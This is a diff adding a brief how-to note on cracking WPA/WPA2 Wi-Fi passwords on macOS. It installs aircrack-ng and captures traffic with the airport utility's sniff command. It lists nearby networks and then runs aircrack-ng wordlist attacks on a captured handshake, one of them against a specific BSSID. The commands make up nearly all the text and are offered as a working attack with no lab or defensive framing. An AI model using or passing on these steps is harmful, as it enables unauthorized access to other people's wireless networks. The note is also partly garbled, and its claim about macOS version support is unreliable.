@@ -1,0 +1,20 @@
+To install Aircrack-ng using Homebrew, you can follow these steps
+* brew install aircrack-ng 
+
+command provided initiates a Wi-Fi packet capture using the built-in macOS airport utility. However, it requires the airport command-line tool, which is only available in macOS versions prior to Catalina (10.15).
+
+* sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport en0 sniff
+
+The command is used to display a list of available Wi-Fi networks and their information on macOS.
+* /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
+
+￼
+
+The command  is used to perform a WPA/WPA2-PSK key recovery attack using a wordlist against a captured handshake file.
+
+* sudo aircrack-ng -w wordlist.txt /tmp/airportSniffPa92xf.cap
+
+￼
+You can proceed with attempting to crack the WPA password for this network using aircrack-ng. Use the following command:
+
+* sudo aircrack-ng -w wordlist.txt -b 04:92:26:B1:7D:03 /tmp/airportSniffPa92xf.cap
